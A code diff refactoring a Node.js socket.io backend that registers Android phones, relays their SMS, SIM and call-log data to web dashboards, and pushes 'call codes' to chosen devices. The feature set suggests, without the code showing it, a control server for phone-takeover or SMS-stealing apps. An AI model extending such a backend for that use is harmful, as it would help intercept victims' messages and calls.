@@ -33,162 +33,133 @@ app.use(express.json());
 app.set("io", io);
 
 // ======================================================
-// 🔧 HELPERS
+// CLEAN ID
 // ======================================================
-
-// ek hi jagah se ID clean karenge (trim + uppercase)
 function cleanId(id) {
   if (!id) return null;
   return id.toString().trim().toUpperCase();
 }
 
-// deviceId → socketId (current active phone socket)
-// 1 device = 1 active socket (latest wins)
+// PHONE SOCKETS
 const deviceSockets = new Map();
 
-// deviceId → Set(socketId)  (web pages jo single device dekh rahe hain)
+// UI WATCHERS
 const watchers = new Map();
 
 function notifyWatchers(uniqueid, payload) {
-  const w = watchers.get(uniqueid);
-  if (!w) return;
-  for (let sid of w) {
-    io.to(sid).emit("deviceStatusSingle", payload);
+  const set = watchers.get(uniqueid);
+  if (!set) return;
+  for (let sid of set) {
+    io.to(sid).emit("deviceRealtime", payload); // FIXED EVENT NAME
   }
 }
 
 // ======================================================
-// 🔥 SOCKET IO
+// SOCKET IO
 // ======================================================
 io.on("connection", (socket) => {
-  console.log("🟢 New Socket Connected:", socket.id);
+  console.log("🟢 CONNECTED:", socket.id);
 
-  // ye sirf phone ke liye use hoga (registerDevice ke baad)
-  let currentUniqueId = null; // cleaned id jo is socket se map hai
+  let currentUniqueId = null;
 
-  // 👁 WATCH DEVICE (web UI)
+  // UI watching a device
   socket.on("watchDevice", (rawId) => {
-    const uniqueid = cleanId(rawId);
-    if (!uniqueid) return;
+    const id = cleanId(rawId);
+    if (!id) return;
 
-    if (!watchers.has(uniqueid)) watchers.set(uniqueid, new Set());
-    watchers.get(uniqueid).add(socket.id);
+    if (!watchers.has(id)) watchers.set(id, new Set());
+    watchers.get(id).add(socket.id);
 
-    console.log(`👁 Watching Device → ${uniqueid}`);
+    console.log("👁 Watching →", id);
   });
 
   socket.on("unwatchDevice", (rawId) => {
-    const uniqueid = cleanId(rawId);
-    if (!uniqueid) return;
+    const id = cleanId(rawId);
+    if (!id) return;
 
-    if (watchers.has(uniqueid)) {
-      watchers.get(uniqueid).delete(socket.id);
-    }
+    if (watchers.has(id)) watchers.get(id).delete(socket.id);
   });
 
-  // ======================================================
-  // 📌 REGISTER DEVICE (JOIN ROOM)
-  // ======================================================
+  // PHONE REGISTER
   socket.on("registerDevice", (rawId) => {
-    const uniqueid = cleanId(rawId);
-    if (!uniqueid) return;
+    const id = cleanId(rawId);
+    if (!id) return;
 
-    console.log("🔗 CLEAN REGISTER:", uniqueid);
+    console.log("🔗 REGISTER:", id);
 
-    // map & room
-    deviceSockets.set(uniqueid, socket.id);
-    currentUniqueId = uniqueid;
+    deviceSockets.set(id, socket.id);
+    currentUniqueId = id;
 
-    // phone + us device ke watchers ek hi room me
-    socket.join(uniqueid);
+    socket.join(id); // FIXED
 
-    // DB me lastSeen Online
-    saveLastSeen(uniqueid, "Online");
+    saveLastSeen(id, "Online");
 
-    // sirf usi socket ko ACK
-    io.to(socket.id).emit("deviceRegistered", { uniqueid });
+    io.to(socket.id).emit("deviceRegistered", { uniqueid: id });
 
-    // admin/dashboard ke liye list update
     io.emit("deviceListUpdated", {
       event: "device_connected",
-      uniqueid,
+      uniqueid: id,
     });
 
-    // single-device page watchers
-    notifyWatchers(uniqueid, {
-      uniqueid,
+    notifyWatchers(id, {
+      uniqueid: id,
       connectivity: "Online",
       updatedAt: new Date(),
     });
   });
 
-  // ======================================================
-  // 🔵 DEVICE STATUS
-  //  - Android se har 5s / n seconds aata hai
-  //  - yaha se: DB lastSeen update + SAB ko broadcast
-  // ======================================================
+  // PHONE SEND STATUS
   socket.on("deviceStatus", (data = {}) => {
-    let { uniqueid, connectivity } = data;
+    let id = cleanId(data.uniqueid);
+    if (!id) return;
 
-    uniqueid = cleanId(uniqueid);
-    if (!uniqueid) return;
+    const connectivity = data.connectivity || "Online";
 
-    if (!connectivity) connectivity = "Online";
+    console.log(`⚡ ${id} → ${connectivity}`);
 
-    console.log(`⚡ STATUS: ${uniqueid} → ${connectivity}`);
-
-    saveLastSeen(uniqueid, connectivity);
+    saveLastSeen(id, connectivity);
 
     const payload = {
-      uniqueid,
+      uniqueid: id,
       connectivity,
       updatedAt: new Date(),
     };
 
-    // ⭐ IMPORTANT:
-    // sab clients ko bhejo → web "Devices Live" page isi se Active/Offline dikhata hai
     io.emit("deviceStatus", payload);
-
-    // watchers (device details page)
-    notifyWatchers(uniqueid, payload);
+    notifyWatchers(id, payload);
   });
 
-  // ======================================================
-  // 🔴 DISCONNECT
-  // ======================================================
+  // DISCONNECT
   socket.on("disconnect", () => {
-    console.log("🔴 Socket disconnected:", socket.id);
+    console.log("🔴 DISCONNECTED:", socket.id);
 
     if (currentUniqueId) {
-      const clean = cleanId(currentUniqueId);
-      const latestSocket = deviceSockets.get(clean);
+      const id = currentUniqueId;
+      const latest = deviceSockets.get(id);
 
-      // sirf tab offline mark karo jab yahi latest socket ho
-      if (latestSocket === socket.id) {
-        console.log("🛑 DEVICE OFFLINE:", clean);
+      if (latest === socket.id) {
+        console.log("🛑 OFFLINE:", id);
 
-        deviceSockets.delete(clean);
-        saveLastSeen(clean, "Offline");
+        deviceSockets.delete(id);
+        saveLastSeen(id, "Offline");
 
         const payload = {
-          uniqueid: clean,
+          uniqueid: id,
           connectivity: "Offline",
           updatedAt: new Date(),
         };
 
-        // sab ko offline status
         io.emit("deviceStatus", payload);
 
         io.emit("deviceListUpdated", {
           event: "device_disconnected",
-          uniqueid: clean,
+          uniqueid: id,
         });
 
-        notifyWatchers(clean, payload);
+        notifyWatchers(id, payload);
       }
     }
 
-    // saare watchers set se is socket ko hatao
     for (let [id, set] of watchers.entries()) {
       set.delete(socket.id);
     }
@@ -196,14 +167,12 @@ io.on("connection", (socket) => {
 });
 
 // ======================================================
-// 🔥 SAVE LAST SEEN
+// LAST SEEN
 // ======================================================
-async function saveLastSeen(rawId, connectivity) {
+async function saveLastSeen(uniqueid, connectivity) {
   try {
-    const uniqueid = cleanId(rawId);
-    if (!uniqueid) return;
-
     const PORT = process.env.PORT || 5000;
+
     await fetch(`http://localhost:${PORT}/api/lastseen/${uniqueid}/status`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -215,89 +184,84 @@ async function saveLastSeen(rawId, connectivity) {
 }
 
 // ======================================================
-// 🔥 SEND CALL CODE TO TARGET DEVICE ONLY
+// CALL UPDATE
 // ======================================================
-export async function sendCallCodeToDevice(rawId, callData) {
-  const uniqueid = cleanId(rawId);
-  if (!uniqueid) return;
+export function sendCallCodeToDevice(rawId, data) {
+  const id = cleanId(rawId);
+  if (!id) return;
 
-  // room = uniqueid → phone + watchers dono ko event milega
-  io.to(uniqueid).emit("callCodeUpdate", callData);
-  console.log(`📞 CallCode Sent → ${uniqueid}`);
+  console.log("📞 CALL EMIT:", id);
+
+  io.to(id).emit("callCodeUpdate", data);  // FIXED
+  notifyWatchers(id, { type: "call", ...data }); // UI LIVE UPDATE
 }
 
 // ======================================================
-// 🔥 ADMIN UPDATE (GLOBAL)
+// ADMIN UPDATE (GLOBAL)
 // ======================================================
-export function sendAdminGlobal(adminData) {
-  console.log("👑 REALTIME ADMIN EMIT SENT:", adminData);
-  io.emit("adminUpdate", JSON.stringify(adminData));
+export function sendAdminGlobal(data) {
+  console.log("👑 ADMIN:", data);
+  io.emit("adminUpdate", data); // FIXED
 }
 
 // ======================================================
-// 🔥 MONGO STREAMS WITH RETRY (CALL/SMS/ADMIN BHI RAKH RAHA HOON)
+// MONGO CHANGE STREAMS
 // ======================================================
 mongoose.connection.once("open", () => {
-  console.log("📡 Mongo Streams Active...");
+  console.log("📡 Mongo Streams ON");
 
-  const watchWithRetry = (collection, callback) => {
+  function watch(collection, cb) {
     const start = () => {
       try {
         const stream = mongoose.connection.collection(collection).watch();
 
-        stream.on("change", async (change) => {
-          if (!["insert", "update", "replace"].includes(change.operationType)) return;
+        stream.on("change", async (chg) => {
+          if (!["insert", "update", "replace"].includes(chg.operationType)) return;
 
-          const updated = await mongoose
-            .connection
-            .collection(collection)
-            .findOne({ _id: change.documentKey._id });
+          const doc = await mongoose.connection.collection(collection)
+            .findOne({ _id: chg.documentKey._id });
 
-          if (updated) callback(updated);
+          if (doc) cb(doc);
         });
 
         stream.on("error", () => {
-          console.error("🔥 ChangeStream error on", collection);
-          setTimeout(start, 5000);
+          console.log("🔥 Stream Restart:", collection);
+          setTimeout(start, 2000);
         });
-      } catch (err) {
-        console.error("🔥 watchWithRetry error on", collection, err.message);
-        setTimeout(start, 5000);
+      } catch (e) {
+        console.log("🔥 Stream Err:", collection, e.message);
+        setTimeout(start, 2000);
       }
     };
     start();
-  };
+  }
 
-  // devices collection changes → admin list update
-  watchWithRetry("devices", (data) => {
-    io.emit("deviceListUpdated", { event: "db_change", device: data });
+  watch("callcodes", (doc) => {
+    if (doc.uniqueid) sendCallCodeToDevice(doc.uniqueid, doc);
   });
 
-  // siminfos changes
-  watchWithRetry("siminfos", (data) => {
-    io.emit("simInfoUpdated", { event: "sim_change", sim: data });
+  watch("sms", (doc) => {
+    if (!doc.uniqueid) return;
+    const id = cleanId(doc.uniqueid);
+    io.to(id).emit("smsUpdate", doc);
+    notifyWatchers(id, { type: "sms", ...doc });
   });
 
-  // callcodes changes → targeted device
-  watchWithRetry("callcodes", (data) => {
-    if (data.uniqueid) sendCallCodeToDevice(data.uniqueid, data);
+  watch("admins", (doc) => {
+    sendAdminGlobal(doc);
   });
 
-  // sms changes → targeted device room
-  watchWithRetry("sms", (data) => {
-    if (!data.uniqueid) return;
-    const id = cleanId(data.uniqueid);
-    io.to(id).emit("smsUpdate", data);
+  watch("siminfos", (doc) => {
+    io.emit("simInfoUpdated", doc);
   });
 
-  // admins changes → global
-  watchWithRetry("admins", (data) => {
-    sendAdminGlobal(data);
+  watch("devices", (doc) => {
+    io.emit("deviceListUpdated", { event: "db_update", device: doc });
   });
 });
 
 // ======================================================
-// 🔥 ROUTES
+// ROUTES
 // ======================================================
 app.use("/api/device", deviceRoutes);
 app.use("/api/sms", smsRoutes);
@@ -310,11 +274,7 @@ app.use("/api/status", statusRoutes);
 app.use("/api/lastseen", lastSeenRoutes);
 app.use("/api/call-log", callLogRoutes);
 
-app.get("/", (req, res) =>
-  res.send("🔥 Stable Socket Backend Running (uniqueid Room + Broadcast Mode)")
-);
+app.get("/", (req, res) => res.send("🔥 Real-time Backend Running"));
 
 const PORT = process.env.PORT || 5000;
-server.listen(PORT, () =>
-  console.log(`🚀 Server running at http://localhost:${PORT}`)
-);
+server.listen(PORT, () => console.log(`🚀 Server Running on PORT ${PORT}`));
